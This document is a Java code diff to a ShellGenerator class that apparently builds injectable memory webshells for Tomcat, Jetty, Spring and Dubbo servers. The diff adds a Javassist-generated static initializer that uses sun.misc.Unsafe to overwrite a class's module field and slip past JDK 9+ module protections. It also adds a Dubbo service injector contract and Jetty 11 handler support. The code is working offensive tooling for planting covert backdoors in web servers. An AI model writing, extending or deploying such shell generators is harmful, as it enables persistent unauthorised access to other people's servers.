@@ -35,6 +35,7 @@ public class ShellGenerator {
                 request.getServerType(),
                 request.getServerVersion(),
                 request.getEffectiveServletNamespace(),
+                request.isBypassJavaModuleEffective(),
                 request.isShrink()),
                 descriptor.getShellTemplateName());
     }
@@ -87,7 +88,8 @@ public class ShellGenerator {
                 }
                 if ("Jetty".equalsIgnoreCase(context.serverType)
                         && "HandlerInjector".equals(context.injectorName)) {
-                    addJettyHandlerContract(pool, ctClass, context.serverVersion);
+                    addJettyHandlerContract(pool, ctClass, context.serverVersion,
+                            context.servletNamespace);
                 }
                 if ("Tomcat".equalsIgnoreCase(context.serverType)
                         && "UpgradeInjector".equals(context.injectorName)) {
@@ -95,6 +97,13 @@ public class ShellGenerator {
                 }
                 if ("ControllerHandlerInjector".equals(context.injectorName)) {
                     addSpringControllerContract(pool, ctClass, context.servletNamespace);
+                }
+                if (context.injectorName.endsWith("DubboServiceInjector")) {
+                    addDubboServiceContract(pool, ctClass, context.shellClassName);
+                }
+
+                if (context.bypassJavaModule) {
+                    injectJavaModuleBypass(ctClass);
                 }
 
                 JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
@@ -109,6 +118,32 @@ public class ShellGenerator {
                 ctClass.detach();
             }
         }
+    }
+
+    /** 让 Shell 自身成为反射调用方时同样具备 JDK 9+ 模块访问能力。 */
+    private void injectJavaModuleBypass(CtClass ctClass) throws Exception {
+        final String methodName = "bypassJavaModule";
+        ctClass.addMethod(CtNewMethod.make(
+                "private static void " + methodName + "(Class target){"
+                        + "try{"
+                        + "Class uc=Class.forName(\"sun.misc.Unsafe\");"
+                        + "java.lang.reflect.Field uf=uc.getDeclaredField(\"theUnsafe\");"
+                        + "uf.setAccessible(true);"
+                        + "Object u=uf.get(null);"
+                        + "Object m=Class.class.getMethod(\"getModule\",new Class[0])"
+                        + ".invoke(Object.class,new Object[0]);"
+                        + "java.lang.reflect.Method of=u.getClass().getMethod("
+                        + "\"objectFieldOffset\",new Class[]{java.lang.reflect.Field.class});"
+                        + "Long o=(Long)of.invoke(u,new Object[]{Class.class.getDeclaredField(\"module\")});"
+                        + "java.lang.reflect.Method gs=u.getClass().getMethod("
+                        + "\"getAndSetObject\",new Class[]{Object.class,Long.TYPE,Object.class});"
+                        + "gs.invoke(u,new Object[]{target,o,m});"
+                        + "}catch(Throwable ignored){}"
+                        + "}", ctClass));
+        String call = methodName + "(" + ctClass.getName() + ".class);";
+        CtConstructor initializer = ctClass.getClassInitializer();
+        if (initializer == null) initializer = ctClass.makeClassInitializer();
+        initializer.insertBefore(call);
     }
 
     /**
@@ -161,10 +196,16 @@ public class ShellGenerator {
     /** 补入 Jetty 7-11 AbstractHandler 父类及对应 Servlet Handler 方法。 */
     private void addJettyHandlerContract(ClassPool pool,
                                          CtClass ctClass,
-                                         String serverVersion) throws Exception {
+                                         String serverVersion,
+                                         ServletNamespace servletNamespace) throws Exception {
         if (!"7-10".equals(serverVersion) && !"11".equals(serverVersion)) {
             throw new IllegalArgumentException(
                     "Jetty Handler 的 serverVersion 必须是 7-10 或 11");
+        }
+        if ("11".equals(serverVersion)
+                && servletNamespace.resolve() != ServletNamespace.JAKARTA) {
+            throw new IllegalArgumentException(
+                    "Jetty 11 Handler 需要 jakarta servletNamespace");
         }
         CtClass abstractHandler = pool.makeClass(
                 "org.eclipse.jetty.server.handler.AbstractHandler");
@@ -190,6 +231,7 @@ public class ShellGenerator {
         handle.setBody("{ if (handleRequest($3, $4)) { markHandled($2); return; } forward($args); }");
         ctClass.addMethod(handle);
     }
+
 
     /**
      * 补入 Tomcat 8.5-11 UpgradeProtocol 契约。8.5 与 9+ 的
@@ -270,6 +312,20 @@ public class ShellGenerator {
         ctClass.addMethod(bridge);
     }
 
+    /** Dubbo 动态服务要求实现类与运行时生成的同包接口保持一致。 */
+    private void addDubboServiceContract(ClassPool pool,
+                                         CtClass ctClass,
+                                         String shellClassName) throws Exception {
+        int packageEnd = shellClassName.lastIndexOf('.');
+        String packageName = packageEnd < 0 ? "" : shellClassName.substring(0, packageEnd + 1);
+        String simpleName = packageEnd < 0 ? shellClassName : shellClassName.substring(packageEnd + 1);
+        CtClass service = pool.makeInterface(packageName + "I" + simpleName);
+        service.addMethod(CtNewMethod.abstractMethod(
+                pool.get("byte[]"), "handle", new CtClass[]{pool.get("byte[]")},
+                new CtClass[0], service));
+        ctClass.setInterfaces(new CtClass[]{service});
+    }
+
     /**
      * 将普通字符串转义为可安全写入 Java 字面量的形式
      */
@@ -284,6 +340,7 @@ public class ShellGenerator {
         private final String serverType;
         private final String serverVersion;
         private final ServletNamespace servletNamespace;
+        private final boolean bypassJavaModule;
         private final boolean shrink;
 
         private ShellTemplateContext(String shellClassName,
@@ -296,6 +353,7 @@ public class ShellGenerator {
                                      String serverType,
                                      String serverVersion,
                                      ServletNamespace servletNamespace,
+                                     boolean bypassJavaModule,
                                      boolean shrink) {
             this.shellClassName = shellClassName;
             this.headerName = headerName;
@@ -307,6 +365,7 @@ public class ShellGenerator {
             this.serverType = serverType;
             this.serverVersion = serverVersion;
             this.servletNamespace = servletNamespace;
+            this.bypassJavaModule = bypassJavaModule;
             this.shrink = shrink;
         }
     }
